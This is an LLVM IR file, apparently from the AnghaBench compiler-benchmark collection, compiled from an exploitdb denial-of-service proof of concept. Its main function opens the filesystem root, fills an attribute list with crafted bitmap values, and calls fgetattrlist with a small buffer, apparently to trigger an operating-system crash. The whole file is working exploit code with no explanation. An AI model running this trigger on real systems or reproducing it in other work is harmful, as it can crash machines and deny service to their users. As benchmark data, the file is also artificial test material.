; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_44848.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_44848.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attrlist = type { i32, i32, i32, i32 }

@.str = private unnamed_addr constant [2 x i8] c"/\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [24 x i8] c"unable to open fs root\0A\00", align 1
@ATTR_BIT_MAP_COUNT = common dso_local global i32 0, align 4
@ATTR_CMN_RETURNED_ATTRS = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [9 x i8] c"err: %d\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.attrlist, align 4
  %4 = alloca i64, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %8 = load i32, i32* @O_RDONLY, align 4
  %9 = call i32 @open(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0), i32 %8)
  store i32 %9, i32* %2, align 4
  %10 = load i32, i32* %2, align 4
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %14

12:                                               ; preds = %0
  %13 = call i32 @perror(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %30

14:                                               ; preds = %0
  %15 = bitcast %struct.attrlist* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %15, i8 0, i64 16, i1 false)
  %16 = load i32, i32* @ATTR_BIT_MAP_COUNT, align 4
  %17 = getelementptr inbounds %struct.attrlist, %struct.attrlist* %3, i32 0, i32 2
  store i32 %16, i32* %17, align 4
  %18 = getelementptr inbounds %struct.attrlist, %struct.attrlist* %3, i32 0, i32 0
  store i32 4095, i32* %18, align 4
  %19 = load i32, i32* @ATTR_CMN_RETURNED_ATTRS, align 4
  %20 = getelementptr inbounds %struct.attrlist, %struct.attrlist* %3, i32 0, i32 1
  store i32 %19, i32* %20, align 4
  store i64 16, i64* %4, align 8
  %21 = load i64, i64* %4, align 8
  %22 = call i8* @malloc(i64 %21)
  store i8* %22, i8** %5, align 8
  store i32 0, i32* %6, align 4
  %23 = load i32, i32* %2, align 4
  %24 = load i8*, i8** %5, align 8
  %25 = load i64, i64* %4, align 8
  %26 = load i32, i32* %6, align 4
  %27 = call i32 @fgetattrlist(i32 %23, %struct.attrlist* %3, i8* %24, i64 %25, i32 %26)
  store i32 %27, i32* %7, align 4
  %28 = load i32, i32* %7, align 4
  %29 = call i32 @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i32 %28)
  store i32 0, i32* %1, align 4
  br label %30

30:                                               ; preds = %14, %12
  %31 = load i32, i32* %1, align 4
  ret i32 %31
}

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i8* @malloc(i64) #1

declare dso_local i32 @fgetattrlist(i32, %struct.attrlist*, i8*, i64, i32) #1

declare dso_local i32 @printf(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
